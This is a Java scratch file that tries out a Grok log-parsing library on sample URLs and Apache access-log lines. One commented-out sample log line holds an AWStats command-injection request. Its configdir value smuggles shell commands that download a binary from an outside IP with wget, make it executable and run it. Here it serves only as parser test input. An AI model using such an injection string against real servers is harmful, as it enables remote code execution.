package com.nflabs.Grok;


public class App 
{
    public static void main( String[] args )
    {
    	Grok g = new Grok();
		Pile p = new Pile();
		try {
			///Users/anthonyC/developement/perso/dotjs
			//p.addFromDirectory("patterns/");
			/*
			 * pile
			 */
			//p.addPatternFromFile("/Users/anthonyC/developement/pure-grok-convert/ruby-grok/patterns/pure-ruby/base");
			//p.compile("%{URI} %{WORD:UNWANTED} %{MAC}");
			//Match gm = p.match("http+svn://root:wewewe@www.google.com:21/trololo?=kfovofvov oui 00:de:ad:be:ef:00");
			//gm.garbage.addToRemove("COMMONMAC");
			//gm.garbage.addFromListRemove(lst);
			//gm.garbage.addToRemane("HOSTNAME", "theHost");
			//gm.captures();
			//System.out.println(gm.toJson());
			/*
			 * Grok
			 */
			
			///Users/anthonyC/developement/pure-grok-convert/ruby-grok/patterns/pure-ruby/base
			///Users/anthonyC/developement/base
			g.addPatternFromFile("patterns/base");
			
			//String log = "http://www.google.com/trololo?=lol&oui and 00:de:ad:be:ef:00 on 192.168.0.12 with 'Something Nice in there'";
			//String log = "66.186.236.233 - - [22/Jan/2006:07:35:42 -0500] 'GET / HTTP/1.1' 403 3931 '-' 'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)'";
			//String log ="192.168.0.12 -<> 22/Jan/2006:07:35:42 -0500 http://www.google.fr";
			//String pattern = g.discover(log);
			//System.out.println(pattern);
			//g.compile(pattern);
			//Match gm = g.match(log);
			//gm.captures();
			//System.out.println(gm.toJson());
			
			//g.compile("%{IP:address} - - \\[%{HTTPDATE:timestamp}\\] %{QUOTEDSTRING:request} %{NUMBER:response} (?:%{NUMBER:bytes}|-) %{QUOTEDSTRING:Referer} %{QUOTEDSTRING:Agent}");
			//Match gm;
			g.compile("%{URI}");
			
			Match gm = g.match(/*"2001:0db8:85a3:0042:1000:8a2e:0370:7334"*/ "http://www.google.com/search=lol");
			gm.captures();
			gm.garbage.addToRemove("COMMONMAC");
			gm.garbage.addFromListRemove(null);
			System.out.println(gm.toJson());
			
			
			
			
			
			//gm = g.match("65.103.133.250 - - [22/Jan/2006:07:35:42 -0500] \"GET /awstats/awstats.pl?configdir=|echo;echo%20YYY;cd%20%2ftmp%3bwget%20209%2e136%2e48%2e69%2fmirela%3bchmod%20%2bx%20mirela%3b%2e%2fmirela;echo%20YYY;echo|  HTTP/1.1\" 404 296 \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;)\"");
			//gm.captures();
			//System.out.println(gm.toJson());
			
			
		} catch (Throwable e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
    }
}
